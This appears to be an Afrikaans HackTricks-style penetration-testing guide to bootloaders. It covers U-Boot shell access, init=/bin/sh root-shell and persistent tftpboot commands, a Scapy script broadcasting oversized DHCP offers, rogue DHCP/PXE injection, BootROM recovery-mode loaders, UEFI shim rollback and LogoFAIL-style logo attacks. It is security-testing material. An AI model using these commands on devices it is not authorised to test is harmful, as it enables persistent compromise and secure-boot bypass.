# Bootloader-toetsing

{{#include ../../banners/hacktricks-training.md}}

Die volgende stappe word aanbeveel vir die wysiging van toestel-opstartkonfigurasies en die toetsing van bootloaders soos U-Boot en UEFI-klas loaders. Fokus op om vroeë kode-uitvoering te kry, die assessering van signature/rollback-beskerming, en die misbruik van recovery- of netwerk-boot paaie.

Verwante: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot vinnige wenke en omgewingsmisbruik

1. Kry toegang tot die interpreter-shell
- Tydens opstart, druk ’n bekende break-toets (dikwels enige sleutel, 0, spasie, of ’n bord-spesifieke "magic" volgorde) voor `bootcmd` uitgevoer word om na die U-Boot prompt te val.

2. Inspekteer opstarttoestand en veranderlikes
- Nuttige opdragte:
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Wysig boot-argumente om ’n root shell te kry
- Voeg `init=/bin/sh` by sodat die kernel na ’n shell val in plaas van die normale init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot vanaf jou TFTP server
- Konfigureer netwerk en haal ’n kernel/fit image vanaf LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Maak veranderinge volhoubaar via environment
- As env-stoorplek nie write-protected is nie, kan jy beheer volhoubaar maak:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Kyk vir veranderlikes soos `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` wat fallback-paaie beïnvloed. Verkeerd gekonfigureerde waardes kan herhaalde toegang tot die shell toelaat.

6. Kontroleer debug/onveilig funksies
- Kyk na: `bootdelay` > 0, `autoboot` gedeaktiveer, onbeperkte `usb start; fatload usb 0:1 ...`, vermoë om te `loady`/`loads` via serial, `env import` vanaf onbetroubare media, en kernels/ramdisks gelaai sonder signature checks.

7. U-Boot image/verification toetsing
- As die platform beweer dat verified boot met FIT images gebruik word, probeer beide unsigned en gemanipuleerde images:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Afwesigheid van `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` of legacy `verify=n` gedrag maak dit dikwels moontlik om ewekansige payloads te boot.

## Netwerk-boot oppervlak (DHCP/PXE) en skelm-bedieners

8. PXE/DHCP parameter fuzzing
- U-Boot se legacy BOOTP/DHCP hantering het geheue-veiligheidskwessies gehad. Byvoorbeeld, CVE‑2024‑42040 beskryf geheue-ontblootstelling via vervaardigde DHCP antwoorde wat bytes uit U-Boot-geheue terug op die draad leak. Oefen die DHCP/PXE kodepaaie met oormatig-lang/grensgeval waardes (option 67 bootfile-name, vendor options, file/servername fields) en kyk vir hangups of lekke.
- Minimal Scapy snippet om boot-parameters tydens netboot te stress:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Valideer ook of PXE filename velde deurgegee word aan shell/loader logika sonder sanitization wanneer dit gekoppel is aan OS-kant provisioning-skripte.

9. Toetsing van opdrag-inspuiting via skelm DHCP/PXE bediener
- Stel ’n skelm DHCP/PXE diens op en probeer karakters in filename of options velde inspuit om opdragtolke in later stadiums van die boot-ketting te bereik. Metasploit’s DHCP auxiliary, `dnsmasq`, of aangepaste Scapy-skripte werk goed. Verseker dat jy eers die laboratoriumnetwerk isoleer.

## SoC ROM recovery-modi wat normale opstart oorskry

Baie SoCs maak ’n BootROM "loader" modus beskikbaar wat kode oor USB/UART sal aanvaar, selfs wanneer flash images ongeldig is. As secure-boot fuses nie gebrand is nie, kan dit baie vroeë in die ketting ewekansige kode-uitvoering verskaf.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) of `imx-usb-loader`.
- Voorbeeld: `imx-usb-loader u-boot.imx` om ’n custom U-Boot in RAM te druk en uit te voer.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Voorbeeld: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` of `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Voorbeeld: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` om ’n loader te laai en ’n custom U-Boot op te laai.

Evalueer of die toestel secure-boot eFuses/OTP gebrand het. Indien nie, BootROM download-modi omseil dikwels enige hoërvlak verifikasie (U-Boot, kernel, rootfs) deur jou eerste-fase payload direk vanaf SRAM/DRAM uit te voer.

## UEFI/PC-klas bootloaders: vinnige kontroles

10. ESP-manipulasie en rollback-toetsing
- Mount die EFI System Partition (ESP) en kyk vir loader-komponente: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
- Probeer boot met downgraded of bekende kwesbare signed boot components indien Secure Boot revocations (dbx) nie up-to-date is nie. As die platform steeds ou shims/bootmanagers vertrou, kan jy dikwels jou eie kernel of `grub.cfg` vanaf die ESP laai om volhoubaarheid te kry.

11. Boot-logo parsing bugs (LogoFAIL class)
- Verskeie OEM/IBV firmwares was kwesbaar vir beeld-parsing foute in DXE wat boot logo’s verwerk. As ’n aanvaller ’n vervaardigde beeld op die ESP onder ’n vendor-spesifieke pad (bv. `\EFI\<vendor>\logo\*.bmp`) kan plaas en herbegin, kan kode-uitvoering tydens vroeë opstart moontlik wees selfs met Secure Boot geaktiveer. Toets of die platform gebruiker-verskafte logo’s aanvaar en of daardie paaie van die OS af skryfbaar is.

## Hardeware waarskuwing

Wees versigtig wanneer jy met SPI/NAND flash tydens vroeë opstart (bv. grondpunte kortsluit om reads te omseil) omgaan en raadpleeg altyd die flash datasheet. Verkeerd getimede shorts kan die toestel of die programmer beskadig.

## Aantekeninge en addisionele wenke

- Probeer `env export -t ${loadaddr}` en `env import -t ${loadaddr}` om environment blobs tussen RAM en stoorplek te skuif; sommige platforms laat toe om env vanaf verwyderbare media te import sonder verifikasie.
- Vir volhoubaarheid op Linux-gebaseerde stelsels wat via `extlinux.conf` boot, is die wysiging van die `APPEND` lyn (om `init=/bin/sh` of `rd.break` in te spuit) op die bootpartition dikwels genoeg wanneer geen signature checks afgedwing word nie.
- As userland `fw_printenv/fw_setenv` bied, valideer dat `/etc/fw_env.config` met die werklike env-stoorplek ooreenstem. Verkeerd gekonfigureerde offsets laat jou toe om die verkeerde MTD-streek te lees/skryf.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
